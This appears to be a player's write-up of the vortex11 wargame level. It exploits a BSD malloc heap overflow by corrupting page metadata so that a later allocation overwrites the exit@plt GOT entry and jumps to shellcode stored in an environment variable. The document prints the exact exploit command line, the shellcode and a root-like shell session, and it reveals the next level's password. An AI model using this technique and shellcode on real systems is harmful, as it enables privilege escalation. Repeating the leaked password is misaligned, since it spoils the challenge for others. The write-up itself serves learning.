
we must find a way to overwrite the pointer s to the return address, then redirect to a payload.  
do do so, we must find a way to corrupt the heap so that s will be pointed to the return addres memory, let's dig in the malloc code:  
we discover that malloc() uses imalloc(), which uses malloc_bytes() in the event of a small allocation (0xf is small)  
we find our answer in here: http://www.ouah.org/BSD-heap-smashing.txt  

with not much knowledge, we can see that the mallocs in this vortex11.c is shaped exactly as in the POC 1 in the link, so we want to overwrite the pginfo struct of the second page (description below):
```c
#include <stdio.h>
#include <string.h>


int main(int argc, char **argv) {
        char *p;
        char *q;
        char *r;
        char *s;
        if (argc < 3)					//must include 2 args...
        {
                exit(0);
        }
        p = (char *) malloc(0x800);		//first page part1 (half page)
        q = (char *) malloc(0x10);		//second page part1 (tiny page)
        r = (char *) malloc(0x800);		//first page part2 (half page) - overflow this segment to overwrite pginfo
        strcpy(r , argv[1]);			//overflow
        s = (char *) malloc(0x10);		//allocate according to corrupt pginfo --> should point to ret addr
        strncpy(s , argv[2], 0xf);		//overwrite the return addr with desired payload addr - let's say env variable
        exit(0);
}
```
  
preparing payloads: ./vortex11 $(python -c 'print "A"*0x800+"BBBB"+"CCCC"') $(python -c 'print "ADDR"')  
need to replace CCCC with ret addr, ADDR with payload addr...  
verifing that it works:
```bash
(gdb) info reg
eax            0x43434383       1128481667
ecx            0x0      0
edx            0x43434343       1128481603
ebx            0xf7fcd000       -134426624
esp            0xffffcee0       0xffffcee0
ebp            0xffffcf08       0xffffcf08
esi            0x0      0
edi            0x0      0
eip            0x8049e43        0x8049e43 <main+111>
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```
I chose to overwrite exit@plt.got table entry, which is located in: 0x804c008 (-0x40) = 0x0804bfc8  
$EGG = <payload>  
figuring out the address of envp via a simple c code we get: ffffe91f : EGG=��������������������������������������������������1�Ph//shh/bin��PS��1�1ɰ  
finally, after some trial and error:  
/vortex/vortex11 $(python -c 'print "A"*0x800+"BBBB"+"\xc7\xbf\x04\x08"') $(python -c 'print "x\05\xd9\xff\xff"')  

```bash
$ whoami
vortex12
$ cat /vortex_pass/vortex12
cat: /vortex_pass/vortex12: No such file or directory
$ cat /etc/vortex_pass/vortex12
nKV95q]dx
$ exit
```
password: nKV95q]dx


